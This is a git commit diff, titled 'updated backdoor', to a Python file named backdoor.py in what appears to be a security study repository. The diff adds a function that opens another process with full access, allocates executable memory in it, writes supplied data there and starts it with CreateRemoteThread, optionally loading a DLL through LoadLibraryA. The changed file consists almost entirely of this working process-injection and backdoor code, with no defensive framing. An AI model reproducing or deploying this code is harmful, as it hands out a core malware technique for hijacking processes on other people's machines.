3d3609d71ef2296b2645ae2d7634f5d059f5d12a
TheDiplomats <socx@protonmail.com>
2020-06-05 18:34:27 -0700

    updated backdoor

--- v2/forensics/ghp/backdoor.py
+++ v2/forensics/ghp/backdoor.py
@@ -2,6 +2,7 @@ import sys
 from ctypes import *
 from my_debugger_defines import *
 
+
 kernel32 = windll.kernel32
 PAGE_EXECUTE_READWRITE = 0x00000040
 PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
@@ -20,3 +21,31 @@ startupinfo.cb = sizeof(startupinfo)
 kernel32.CreateProcessA(path_to_exe, None, None, None, None, creation_flags, None, None, byref(startupinfo), byref(process_information))
 
 pid = process_information.dwProcessId
+
+
+def inject(pid, data, parameter = 0):
+	# Get handle to process injecting into #
+	h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
+	
+	if not h_process:
+		print("[!] Could not acquire a handle fto PID: %s" % pid)
+		sys.exit(0)
+	
+	arg_address = kernel32.VirtualAllocEx(h_process, 0, len(data), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
+	written = c_int(0)
+	kernel32.WriteProcessMemory(h_process, arg_address, data, len(data), byref(written))
+	
+	thread_id = c_ulong(0)
+	
+	if not parameter:
+		start_address = arg_address
+	else:
+		h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
+		start_address = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
+		parameter = arg_address
+	
+	if not kernel32.CreateRemoteThread(h_process, None, 0, start_address, parameter, 0, byref(thread_id)):
+		print("[*] Failed to inject DLL exiting.")
+		sys.exit(0)
+	
+	return True
